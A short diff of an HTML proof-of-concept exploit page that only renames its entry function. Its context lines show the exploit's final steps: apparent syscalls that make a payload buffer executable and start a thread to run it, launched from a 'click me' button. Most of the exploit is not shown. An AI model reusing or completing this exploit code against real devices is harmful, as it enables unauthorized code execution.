@@ -1,5 +1,5 @@
 <script>
-function poc(){
+function poc1(){
 var p;
 var s={};
 var g={};
@@ -701,4 +701,4 @@ payloadbuf.backing[i]=payload[i];
 p.syscall(74,payloadbuf,65536,7);
 p.syscall(324,1);p.fcall(createThread,payloadbuf,0,p.sptr("payload"));
 done();
-}}</script><button onclick="try{poc()}catch(e){alert(e);}">click me</button>
+}}</script><button onclick="try{poc1()}catch(e){alert(e);}">click me</button>
